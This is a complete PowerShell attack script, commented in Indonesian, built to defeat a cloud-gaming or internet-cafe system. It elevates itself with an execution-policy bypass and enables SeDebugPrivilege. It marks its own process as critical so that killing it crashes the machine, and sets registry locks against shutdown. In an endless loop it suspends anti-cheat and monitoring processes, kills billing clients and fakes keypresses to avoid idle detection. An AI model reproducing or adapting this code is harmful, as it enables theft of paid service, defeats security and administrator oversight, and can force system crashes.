# ==========================================
#  UNSTOPPABLE CLOUD KILLER - V5
#  BSOD Trap, Kernel Freeze, Billing Nuke
# ==========================================

# 1. Cek Admin & Relaunch
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] BUTUH ADMIN. RELAUNCHING..." -ForegroundColor Red
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Exit
}

# 2. Inject C# API (Kernel Level)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class CloudKiller {
    [DllImport("ntdll.dll")] public static extern uint NtSuspendProcess(IntPtr h);
    [DllImport("ntdll.dll")] public static extern uint RtlSetProcessIsCritical(bool b, out bool o, bool s);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool i, int p);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] public static extern uint SetThreadExecutionState(uint f);
    [DllImport("user32.dll")] public static extern void keybd_event(byte b, byte s, uint f, UIntPtr e);
    
    [DllImport("advapi32.dll")] public static extern bool OpenProcessToken(IntPtr h, uint a, out IntPtr t);
    [DllImport("advapi32.dll")] public static extern bool LookupPrivilegeValue(string s, string n, out long l);
    [DllImport("advapi32.dll")] public static extern bool AdjustTokenPrivileges(IntPtr t, bool d, ref TP n, int b, IntPtr p, IntPtr r);
    [StructLayout(LayoutKind.Sequential, Pack=4)] public struct TP { public int c; public long l; public int a; }

    public static void EnableDebug() {
        IntPtr h;
        if (OpenProcessToken(Process.GetCurrentProcess().Handle, 0x0020 | 0x0008, out h)) {
            TP tp = new TP(); tp.c = 1; tp.a = 2;
            if (LookupPrivilegeValue(null, "SeDebugPrivilege", out tp.l)) AdjustTokenPrivileges(h, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            CloseHandle(h);
        }
    }
    
    public static void Trap() {
        bool o; RtlSetProcessIsCritical(true, out o, false); // JIKA DI-KILL, PC BSOD!
    }
}
"@

# 3. Aktifkan Mode Dewa
[CloudKiller]::EnableDebug()
[CloudKiller]::Trap() # Pasang BSOD Trap

# 4. Registry Lock (Anti-Shutdown & Task Manager)
Write-Host "[*] Mengunci Sistem..." -ForegroundColor Yellow
try {
    New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoClose" -Value 1 -Type DWord -Force
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableShutdown" -Value 1 -Type DWord -Force
} catch {}

# 5. DAFTAR TARGET BERDASARKAN SCREENSHOT LO
# JANGAN DISENTUH! (Streaming & VNC biar koneksi ga putus)
$PROTECTED = @(
    "gameviewer", "gameviewerservice", "tvnserver", "stmightvncclient", 
    "explorer", "system", "svchost", "winlogon", "csrss", "dwm", "lsass", "wininit"
)

# DIBEKUKAN (Anti-Cheat & Monitor)
$SUSPEND = @(
    "ace-tray", "matrix_loginserver", "sguard", "sguard64", 
    "netagent", "generalsettingtool", "host_monitor", "log_client"
)

# DIBUNUH TOTAL (Billing & Blocker)
$KILL = @(
    "bysvcappclient", "gameservice", "byomenu", "bugdumpvcr32", 
    "zhamba_cli", "qianclient", "qianmonitor", "npxsvc", "npxrun", "diskclient"
)

Write-Host "=========================================" -ForegroundColor Cyan
Write-Host "  TOTAL DOMINATION AKTIF!" -ForegroundColor Green
Write-Host "  Stream Aman. Anti-Cheat Dibekuin." -ForegroundColor Yellow
Write-Host "  BSOD TRAP: NYALA (Admin Ga Bisa Kill!)" -ForegroundColor Red
Write-Host "=========================================" -ForegroundColor Cyan

# 6. Looping Abadi (Brutal Mode)
while ($true) {
    try {
        # Anti-Sleep (Maksa layar nyala terus)
        [CloudKiller]::SetThreadExecutionState(0x80000000 -bor 0x00000001 -bor 0x00000002) | Out-Null
        
        # Anti-AFK (Spam F15 biar server ngira lo main)
        [CloudKiller]::keybd_event(0x7E, 0, 0, [UIntPtr]::Zero)
        [CloudKiller]::keybd_event(0x7E, 0, 2, [UIntPtr]::Zero)

        foreach ($proc in Get-Process -ErrorAction SilentlyContinue) {
            $name = $proc.ProcessName.ToLower()
            
            # Lewati proses yang dilindungi
            if ($PROTECTED -contains $name) { continue }

            # Freeze Anti-Cheat (Biarkan hidup, tapi ga bisa gerak)
            if ($SUSPEND -contains $name) {
                $h = [CloudKiller]::OpenProcess(0x0800, $false, $proc.Id)
                if ($h -ne [IntPtr]::Zero) {
                    [CloudKiller]::NtSuspendProcess($h) | Out-Null
                    [CloudKiller]::CloseHandle($h) | Out-Null
                }
            }
            # Kill Billing / Timer
            elseif ($KILL -contains $name) {
                Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
            }
        }
    } catch {}
    
    # Jeda 50ms (Cepat tapi CPU aman)
    Start-Sleep -Milliseconds 50
}
